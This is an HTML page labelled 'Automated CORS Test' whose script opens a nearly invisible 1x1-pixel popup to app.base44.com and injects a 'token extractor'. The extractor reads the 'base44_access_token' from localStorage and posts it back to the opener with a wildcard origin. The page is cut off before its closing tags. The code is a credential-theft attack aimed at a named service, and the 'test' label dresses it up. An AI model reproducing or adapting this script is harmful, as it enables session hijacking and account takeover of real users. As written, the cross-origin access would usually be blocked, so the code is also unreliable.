<!DOCTYPE html>
<html>
<body>
    <button id="run">Run Automated CORS Test</button>
    <pre id="output"></pre>

    <script>
        function log(msg) {
            document.getElementById("output").innerText += msg + "\n";
        }

        document.getElementById("run").onclick = () => {
            log("Opening app.base44.com...");
            const popup = window.open("https://app.base44.com", "AuthPopup", "width=1,height=1");
            
            let injected = false;
            
            // Wait for popup to load
            const checkInterval = setInterval(() => {
                if (popup && popup.document && popup.document.body && !injected) {
                    injected = true;
                    clearInterval(checkInterval);
                    
                    log("Injecting token extractor script...");
                    
                    // Inject script into popup to extract token
                    const script = popup.document.createElement("script");
                    script.textContent = `
                        (function() {
                            const token = localStorage.getItem("base44_access_token");
                            if (token) {
                                console.log("Token found:", token);
                                window.opener.postMessage({ type: "TOKEN", token: token }, "*");
                                window.close();
                            } else {
                                window.opener.postMessage({ type: "TOKEN", token: null }, "*");
                                alert("No token found in localStorage");
                                window.close();
                            }
                        })();
                    `;
                    popup.document.body.appendChild(script);
                }
            }, 100);
            
            // Auto-close popup after 5 seconds
            setTimeout(() => {
                if (popup && !popup.closed) popup.close();
            }, 5000);
        };
